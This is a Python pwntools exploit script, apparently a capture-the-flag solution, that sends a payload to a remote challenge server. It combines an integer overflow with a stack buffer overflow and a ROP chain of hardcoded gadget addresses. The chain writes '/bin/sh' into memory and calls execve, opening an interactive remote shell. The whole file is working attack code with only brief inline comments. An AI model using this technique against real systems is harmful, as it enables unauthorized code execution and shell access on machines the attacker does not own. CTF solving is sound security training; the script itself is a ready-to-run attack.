#!/usr/bin/env python3

from pwn import *

# Gadgets

pop_eax = 0x08052a98
pop_ebx = 0x0804901e
xchg_eax_edx = 0x080a71fb
mov_edx_eax = 0x0805f85a
pop_ecx = 0x08064844
xor_eax = 0x08057bd0
inc_eax = 0x08086c59
syscall = 0x08049c52

# Others

data_start = 0x080ec000
str1 = 0x6e69622f
str2 = 0x0068732f

# Building the ROPchain

chain1 = [
    pop_eax,
    data_start,
    xchg_eax_edx,
    pop_eax,
    str1,
    mov_edx_eax, # write /bin to .data

    pop_eax,
    data_start + 4,
    xchg_eax_edx,
    pop_eax,
    str2,
    mov_edx_eax, # write /sh\0 to .data + 4

    pop_ebx,
    data_start, # first parameter of execve, points to /bin/sh in .data

    pop_ecx,
    0, # write 0 to ecx (second parameter of execve)

    xor_eax,
    xchg_eax_edx, # put 0 to edx as well

    xor_eax  # zero out eax again
]

# then increment it 11 times and syscall execve
chain = chain1 + [inc_eax for _ in range(11)] + [syscall]

def main():
    padding = b"A" * 76
    rop = [p32(x) for x in chain]
    payload = padding + b"".join(rop)
    offset = -2147483648 + (len(payload) // 4) # BOF from integer overflow
    p = remote("sie2op7ohko.hackday.fr", 1340)
    p.recvline()
    p.sendline(bytes(str(offset), 'utf-8'))
    p.recvline()
    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    main()
